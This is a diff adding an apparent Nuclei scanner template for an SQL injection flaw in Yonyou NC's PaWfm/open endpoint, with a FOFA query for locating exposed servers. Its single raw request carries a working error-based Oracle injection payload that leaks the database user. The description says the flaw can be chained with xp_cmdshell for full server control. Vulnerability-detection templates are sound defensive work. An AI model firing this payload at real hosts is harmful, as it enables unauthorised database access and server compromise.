@@ -1,0 +1,41 @@
+id: yongyouNC-PaWfm-sqli
+
+info:
+  name: 用友NC-PaWfm-SQL注入漏洞
+  author: candada
+  severity: high
+  description: '用友NC /portal/pt/PaWfm/open接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。'
+  reference:
+    - https://
+  tags: 2024,用友,sqli,yonyou-ufida-nc
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="1085941792" && body="/logo/images/logo.gif"
+  classification:
+    cvss-metrics: 
+    cvss-score: 
+    cve-id: 
+    cwe-id: 
+    epss-score: 
+    epss-percentile: 
+    cpe:
+
+http:
+  - raw:
+      - |+
+        GET /portal/pt/PaWfm/open?pageId=login&proDefPk={urlenc(1'AND+1=UTL_INADDR.GET_HOST_ADDRESS('~TestSql~'||(user)||'~TestSql~')--#)} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "TestSql"
+      - type: status
+        status:
+          - 500
